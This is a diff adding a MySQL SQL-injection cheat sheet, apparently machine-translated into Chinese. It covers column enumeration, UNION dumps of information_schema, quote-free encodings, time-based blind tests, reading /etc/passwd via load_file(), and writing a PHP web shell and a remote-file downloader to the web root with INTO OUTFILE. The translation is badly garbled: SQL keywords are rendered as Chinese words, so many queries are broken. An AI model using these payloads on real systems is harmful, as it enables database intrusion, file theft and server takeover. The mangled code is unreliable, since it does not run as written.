@@ -1,0 +1,117 @@
+MYSQL
+表和列
+
+确定列数
+GROUP/ORDER BY n+1;
+注：
+一直递增这个数字，直到得到错误的响应为止。
+尽管GROUPBY和ORDERBY在SQL中具有不同的功能，但它们都可以完全相同的方式用于确定查询中的列数。
+例子：
+给定查询 SELECT username, password, permission FROM Users WHERE id = '{INJECTION POINT}';
+1‘顺序1-+	千真万确
+1‘顺序2-+	千真万确
+1‘顺序3-+	千真万确
+1‘顺序4-+	假查询仅使用3列。
+-1‘联盟选择1，2，3-+	千真万确
+检索表
+UNION从Information_schema.table中选择group_conat(Table_Name)，其中version=10；
+注：
+MySQL 5的版本=10
+检索列
+从Information_schema.Columns_name=‘tablename’中选择group_conat(列_name)
+一次检索多个表/列
+选择(@)FROM(SELECT(@：=0x00)，(SELECT(@)FROM(Information_SCHEMA列)(TABLE_SCHEMA>=@)和(@)in(@：=conat(@，0x0a，‘，table_schema，’]，table_name，‘>’，Column_name)
+例子：
+从id=‘-1’联合选择1，2的用户中选择*，(选择(@)FROM(SELECT(@：=0x00)，(SELECT(@)FROM(Information_schema.列)，其中(table_schema>=@)和(@)in(@：=conat(@，0x0a，‘，[’，table_schema，‘]，table_name，’>，Column_name), 4--+';
+产出：
+[ information_schema ] >CHARACTER_SETS > CHARACTER_SET_NAME
+[ information_schema ] >CHARACTER_SETS > DEFAULT_COLLATE_NAME
+[ information_schema ] >CHARACTER_SETS > DESCRIPTION
+[ information_schema ] >CHARACTER_SETS > MAXLEN
+[ information_schema ] >COLLATIONS > COLLATION_NAME
+[ information_schema ] >COLLATIONS > CHARACTER_SET_NAME
+[ information_schema ] >COLLATIONS > ID
+[ information_schema ] >COLLATIONS > IS_DEFAULT
+[ information_schema ] >COLLATIONS > IS_COMPILED
+						
+从Information_schema列中选择MID(group_conat(0x3c62723e，0x5461626c653a20)，table_name，0x3c62723e，0x436f6c756d6e3a20，列名顺序(从Information_schema.table中选择Version)分隔符0x3c62723e，1，1024)。
+例子：
+从id=‘-1’联合选择的用户中选择用户名MID(组_CONAT(0x3c62723e，0x5461626c653a20，table_name，0x3c62723e，0x436f6c756d6e3a20，Column_name Order by(从Information_schema.table中选择版本)分隔符0x3c62723e)，1，1024)--+';
+产出：
+Table: talk_revisions
+Column: revid
+
+Table: talk_revisions
+Column: userid
+
+Table: talk_revisions
+Column: user
+
+Table: talk_projects
+Column: priority
+					
+从列名查找表
+从Information_schema.Columns_name=‘username’的列中选择table_name；	查找任何名为username的列的表名。
+从Information_SCHEMA列中选择TABLE_NAME，其中列名称类似于‘%USER%’；	查找包含单词User的任何列的表名。
+从表名中查找列
+从Information_SCHEMA中选择Column_NAME，其中TABLE_NAME=‘User’；	查找User表的列。
+从Information_SCHEMA中选择Column_NAME，其中TABLE_NAME类似于‘%USER%’；	查找包含单词User的任何表的列名。
+查找当前查询
+从Information_schema.processlist中选择信息	可从MySQL 5.1.7开始。
+避免使用引文
+从用户名=0x61646D696E的用户中选择*	十六进制编码。
+从username=char(97，100，109，105，110)的用户中选择*	CHAR()函数
+串级联
+选择a‘d’mi‘n’；
+选择conat(‘a’，‘d’，‘m’，‘i’，‘n’)；
+选择conat_WS(‘，’a‘，’d‘，’m‘，’i‘，’n‘)；
+选择group_conat(‘a’，‘d’，‘m’，‘i’，‘n’)；
+注：
+CONCAT()如果它的任何论证都是空的，它将返回空。相反使用CONCAT_WS().
+第一个论点CONCAT_WS()为其余参数定义分隔符。
+条件语句
+案例
+如果()
+ifnull()
+NULLIF()
+例子：
+选择如果(1=1，真，假);
+选择案例时 1=1 然后千真万确其他假的端部;
+计时
+睡眠()	MySQL 5
+基准()	MySQL 4/5
+例子：
+‘-(如果(中(版本)，1，1)像5，基准(100000，SHA 1(真))-“
+特权
+文件特权
+以下查询可帮助确定给定用户的文件权限。
+从mysql.user选择file_priv，其中user=‘username’；	需要根特权	MySQL 4/5
+从Information_SCHENA.USER_ENCENTIVERS_TYPE=‘file’和象‘%USERNAME%’这样的被授权者中选择获赠者，	不需要特权	MySQL 5
+阅读档案
+如果用户拥有文件权限，则可以读取文件。
+加载文件()
+例子：
+选择加载文件(‘/etc/passwd’);
+选择加载文件(0x2F6574632F7061737764);
+注：
+文件必须位于服务器主机上。
+load_file()的基目录是 @@datadir .
+MySQL用户必须读取该文件。
+文件大小必须小于max_LEXED_PACKET。
+的默认大小。 @@max_allowed_packet 是1047552字节。
+书写文件
+如果用户拥有文件权限，则可以创建文件。
+进入OUTFILE/DUMPFILE
+例子：
+若要编写PHP shell，请执行以下操作：
+选择<？系统($_get[\‘c\’])；？>‘进入OUTFILE‘/var/www/shell.php’；
+然后访问：
+http：/localhost/shell？C=cat%20/etc/passwd
+要编写下载程序：
+选择<？(fopen($_get[f]，\‘w\’)，file_get_content($_get[u])；？>‘进入OUTFILE‘/var/www/get.php’
+然后访问：
+http：/localhost/get.php？F=shell.php&u=http：/localhost/c99.txt
+注：
+不能用 INTO OUTFILE .
+INTO OUTFILE 必须是查询中的最后一条语句。
+无法对路径名进行编码，因此需要引号。
